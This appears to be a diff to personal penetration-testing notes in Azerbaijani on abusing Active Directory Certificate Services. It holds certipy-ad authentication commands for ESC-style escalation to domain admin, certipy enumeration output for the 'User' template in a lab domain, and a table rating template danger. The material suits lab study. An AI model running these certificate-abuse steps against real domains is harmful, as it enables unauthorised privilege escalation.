@@ -34,3 +34,60 @@ certipy-ad auth -u 'username@domain' -p 'newpass' -template VulnerableTemplate
 
 # ESC8 üçün DA autentifikasiyası
 certipy-ad auth -pfx ./user.pfx -username username@domain
+
+=======================================================================================================================================================================
+
+Template Name                       : User ===================================== Çox vacib
+    Display Name                        : User
+    Certificate Authorities             : inlanefreight-CA01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectAltRequireEmail
+                                          SubjectRequireEmail
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-04-28T17:11:06+00:00
+    Template Last Modified              : 2025-04-28T17:11:06+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Domain Users
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
+        Full Control Principals         : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+        Write Property Enroll           : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Domain Users
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+
+
+| Template             | Real həyatda | Təhlükə |
+| -------------------- | ------------ | ------- |
+| **User**             | 10/10        | 🔥🔥🔥 |
+| **Machine**          | 9/10         | 🔥🔥    |
+| **DomainController** | 9/10         | 🔥🔥    |
+| **Custom WebServer** | 8/10         | 🔥🔥🔥  |
+| **SubCA**            | 3/10         | ☠️      |
+| **Enrollment Agent** | 4/10         | ☠️      |
